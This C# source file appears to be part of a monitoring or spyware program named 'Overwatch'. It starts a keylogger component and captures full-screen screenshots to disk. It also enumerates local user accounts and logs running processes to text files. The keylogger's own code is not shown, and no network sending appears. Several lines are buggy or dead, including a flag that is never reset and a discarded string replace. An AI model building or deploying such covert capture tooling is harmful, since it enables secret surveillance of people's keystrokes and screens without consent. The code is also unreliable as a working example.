using System;
using System.Linq;
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Windows;

namespace Overwatch
{
    class cReceiveInformation
    {
        public Graphics graph;
        public cKeylogger keylogger; 
        public Bitmap bmp;
        static appLog Log;
        public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
        public cReceiveInformation()
        {
            graph = null;
            keylogger = new cKeylogger();
            bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Log = new appLog();
        }

        public static List<string> GetComputerUsers()
        {
            List<string> users = new List<string>();
            try
            {
                var path = string.Format("WinNT://{0},computer", Environment.MachineName);
                using (var computerEntry = new DirectoryEntry(path))
                    foreach (DirectoryEntry childEntry in computerEntry.Children)
                        if (childEntry.SchemaClassName == "User")
                        {
                            users.Add(childEntry.Name);
                        }

                return users;
            }
            catch (Exception ex) { Log.Write(ex.Message, true); return users; }
        }

        public void ScreenShoot()
        {
            try
            {
                graph = Graphics.FromImage(bmp);
                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                bmp.Save("D:\\Image.bmp");
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
        public static string TrimLastCharacter(string str)
        {
            if (String.IsNullOrEmpty(str))
                return str;
            else
                return str.TrimEnd(str[str.Length - 1]);
        }

        private static List<string> GeneralProcess()
        {
            Process[] procList = Process.GetProcesses();
            List<int> numbers2 = new List<int>() { 15, 14, 11, 13, 19, 18, 16, 17, 12, 10 };
            IEnumerable<int> largeNumbersQuery = numbers2.Where(c => c > 15);
            List<string> processUse = new List<string>();
            string ProcessName = "";
            bool Equal = false;
            foreach (Process a in procList)
            {
                for (int i = 0; i < processUse.Count; i++)
                {
                    if (a.ProcessName == processUse[i])
                        Equal = true;
                }
                if (Equal == false && a.ProcessName != "svchost")
                    processUse.Add(a.ProcessName);
            }
            foreach (string a in processUse) { ProcessName += a.ToString() + " "; }
            CreateAndUpdateDate(ProcessName, "D:\\GeneralApplication.txt");
            return processUse;
        }
        private static void LocalProcess()
        {
            try
            {
                var Users = GetComputerUsers();
                string UsersName = "";
                foreach (var a in Users) { UsersName += a.ToString() + "|"; UsersName.Replace(" ", ","); }
                UsersName += "Administrator";
                string name = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
                Process.GetProcesses().Where(p => new Regex(UsersName).IsMatch(p.MainWindowTitle)).ToList().ForEach(p => CreateAndUpdateDate(p.ProcessName + " ", "D:\\UsersApplication.txt"));
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
        public void Start() { keylogger.start(); }

        public void Overview() {
            GeneralProcess();
            LocalProcess();
            
        }
    }
}
